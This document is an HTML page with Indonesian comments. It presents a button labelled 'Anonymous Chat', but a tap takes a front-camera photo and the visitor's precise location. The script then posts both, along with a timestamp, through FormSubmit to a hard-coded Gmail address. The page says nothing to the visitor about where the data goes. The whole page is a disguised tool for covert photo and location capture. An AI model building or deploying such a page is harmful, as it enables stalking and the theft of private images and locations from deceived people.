<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Capture & Location</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #0f0;
            overflow: hidden;
        }
        #preview {
            width: 100%;
            height: 60vh;
            object-fit: cover;
            border: 2px solid #0f0;
            display: none;
        }
        #startBtn {
            padding: 15px 30px;
            background: #0f0;
            color: #000;
            border: none;
            font-weight: bold;
            cursor: pointer;
            font-size: 18px;
            margin-top: 20px;
            z-index: 10;
        }
        #status {
            margin-top: 10px;
            font-size: 14px;
            color: #fff;
        }
        .loading {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0f0;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <img id="preview" alt="Preview Kamera">
    <div id="status">Tap tombol untuk mulai</div>
    <button id="startBtn">Anonymous Chat</button>

    <script>
        const btn = document.getElementById('startBtn');
        const preview = document.getElementById('preview');
        const status = document.getElementById('status');

        btn.addEventListener('click', async () => {
            status.innerHTML = 'Meminta izin kamera...';
            btn.disabled = true;

            try {
                // 1. Akses Kamera Depan
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                preview.srcObject = stream;
                
                // Tunggu beberapa saat agar video stabil
                await new Promise(r => setTimeout(r, 500));

                status.innerHTML = 'Mengambil lokasi... <span class="loading"></span>';

                // 2. Ambil Lokasi
                const lokasi = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });

                const lat = lokasi.coords.latitude;
                const lng = lokasi.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

                status.innerHTML = 'Menangkap gambar & mengirim...';

                // 3. Tangkap Gambar
                const canvas = document.createElement('canvas');
                canvas.width = preview.videoWidth || 640;
                canvas.height = preview.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(stream.getVideoTracks()[0].applyConstraints ? 
                    preview : preview, 0, 0, canvas.width, canvas.height);
                
                // Convert ke Blob
                canvas.toBlob(async (blob) => {
                    if (!blob) {
                        status.innerText = 'Gagal menangkap gambar';
                        btn.disabled = false;
                        return;
                    }

                    // 4. Kirim ke FormSubmit
                    const formData = new FormData();
                    formData.append('message', `Lokasi: ${mapLink}\nWaktu: ${new Date().toISOString()}`);
                    formData.append('attachment', blob, 'capture.jpg'); // Nama field 'attachment' penting

                    try {
                        const response = await fetch('https://formsubmit.co/ajax/desamuncrat477@gmail.com', {
                            method: 'POST',
                            body: formData
                        });

                        if (response.ok) {
                            status.innerHTML = '✅ TERKIRIM! Cek email/spam Anda.';
                            btn.innerText = 'DONE';
                        } else {
                            status.innerHTML = '❌ Gagal kirim (Cek Console)';
                            btn.disabled = false;
                        }
                    } catch (error) {
                        status.innerHTML = '❌ Error Jaringan';
                        console.error(error);
                        btn.disabled = false;
                    }

                    // Hentikan stream kamera setelah gambar diambil
                    stream.getTracks().forEach(track => track.stop());
                    preview.style.display = 'block';
                    preview.src = URL.createObjectURL(blob); // Tampilkan hasil tangkapan

                }, 'image/jpeg', 0.8);

            } catch (error) {
                console.error(error);
                status.innerHTML = '❌ Gagal: ' + error.message;
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
